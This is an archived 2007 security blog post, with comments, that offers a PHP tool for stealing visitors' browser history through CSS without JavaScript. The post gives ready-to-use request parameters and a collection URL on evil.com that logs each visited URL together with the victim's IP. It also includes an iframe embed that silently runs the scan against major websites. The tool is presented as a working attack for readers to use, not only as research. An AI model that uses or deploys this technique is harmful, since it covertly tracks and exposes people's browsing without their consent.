<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Noscript HScan</title><meta name="description" content="After releasing my Firefox specific history scanner, RSnake came up with his own bleeding edge history scanning technique which is based on Jeremiah Grossman's implementation but it does not require JavaScript. This approach has its own limitations and advantages."><meta property="name" content="Noscript HScan"><meta itemprop="name" content="Noscript HScan"><meta property="description" content="After releasing my Firefox specific history scanner, RSnake came up with his own bleeding edge history scanning technique which is based on Jeremiah Grossman's implementation but it does not require JavaScript. This approach has its own limitations and advantages."><meta itemprop="description" content="After releasing my Firefox specific history scanner, RSnake came up with his own bleeding edge history scanning technique which is based on Jeremiah Grossman's implementation but it does not require JavaScript. This approach has its own limitations and advantages."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fnoscript-hscan%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fnoscript-hscan%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/noscript-hscan/"><meta property="og:title" content="Noscript HScan"><meta property="og:description" content="After releasing my Firefox specific history scanner, RSnake came up with his own bleeding edge history scanning technique which is based on Jeremiah Grossman's implementation but it does not require JavaScript. This approach has its own limitations and advantages."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fnoscript-hscan%2F?w=1024"><meta name="twitter:title" content="Noscript HScan"><meta name="twitter:description" content="After releasing my Firefox specific history scanner, RSnake came up with his own bleeding edge history scanning technique which is based on Jeremiah Grossman's implementation but it does not require JavaScript. This approach has its own limitations and advantages."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fnoscript-hscan%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"><h1><a href="/"></a></h1><p></p></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Noscript HScan</h1><div class="date">Wed, 28 Feb 2007 22:57:00 GMT</div><div class="author">by pdp</div><div id="post-content"><p>After releasing my Firefox specific <a href="/blog/hscan-redux/">history scanner</a>, RSnake came up with <a href="http://ha.ckers.org/blog/20070228/steal-browser-history-without-javascript">his own</a> bleeding edge history scanning technique which is based on Jeremiah Grossman&#39;s <a href="http://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html">implementation</a> but it does not require JavaScript. This approach has its own limitations and advantages.</p>
<p>On the advantages side, you don&#39;t really need JavaScript to steal the victim&#39;s browser history anymore. So, everybody who is thinking that turning off JavaScript is the safe way to go, you are most definitely wrong. You should turn CSS off too. This is it. Sparten browsing is the key. On the other hand, history scanning without JavaScript is less powerful in a way that attackers are not able to perform actions as soon as a history entry is discovered.</p>
<p>Still, I think that RSnake&#39;s approach is quite interesting and innovative. I decided to write a generic scanner that can be configured on the fly to steal any browser history. The scanner is located <a href="/files/2007/02/noscript-hscan-php.txt">here</a>. Before using it you need to pass several GET or POST (it is up to you really) parameters to the script like this:</p>
<pre><code>noscript-hscan.php?u1=[url]&amp;u2=[url]&amp;t=[target collection point]</code></pre><p>The scanner excepts any number of URLs. The only rule is that every URL parameters must start with <strong>u</strong> (lower case u). It is a good practice to number the URLs that you want to scan as u1, u2, u3, etc. The <strong>t</strong> parameter is for the target collection point. This is the place where the history information will be sent to. The collection point will receive requests that look like the following:</p>
<pre><code>http://evil.com/path/to/collection/point?u=[url]&amp;t=[timestamp]&amp;c=[ip]</code></pre><p>The easiest way you can launch the generated scanning code is to include it inside an iframe. For example you can use something like the following:</p>
<pre><code class="language-html"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"noscript-hscan.php?t=http%3A//evil.com/path/to/collection/point%3F&amp;u0=http%3A//www.yahoo.com/&amp;u1=http%3A//www.google.com/&amp;u2=http%3A//www.myspace.com/&amp;u3=http%3A//www.msn.com/&amp;u4=http%3A//www.ebay.com/&amp;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></code></pre>
<p><em>This is it! It is simple.</em></p>
</div><div id="post-comments"><p><em>Archived Comments</em></p><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/fcaae4cce015a80ca9d013888cb183dd?s=256&amp;d=retro" alt="anonymous"><span class="post-comment-author">anonymous</span><div class="post-comment-content">The PHP download unfortunately gets parsed thus we can get the output, but not the download. You'll have to change the extension ot pack it into a TAR/ZIP file if you want people to download it.

Thanks a lot!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">That's the purpose of it. You can use it straight from here... no need to download.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5c4f68132e344371b8ec9545ced719ee?s=256&amp;d=retro" alt="Joe"><span class="post-comment-author">Joe</span><div class="post-comment-content">nice tool, thank you</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/049995fad6ad37c27bccef86ab1f80b7?s=256&amp;d=retro" alt="Franck"><span class="post-comment-author">Franck</span><div class="post-comment-content">Doesnt work here. Not in IE neither FF. I am seeing 'v' characters as output. This is supposed to mean 'visited'? But I never visit those sites. Even a fake url shows up as 'v'. So I don't get this..</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">Visited sites will show up as pink Vs while not visted sites will show up as simle blue Vs. See the generated CSS for more information how it works.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">and now you can download the code.</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2020 <a href=""></a>. All rights reserved.</p></footer></body></html>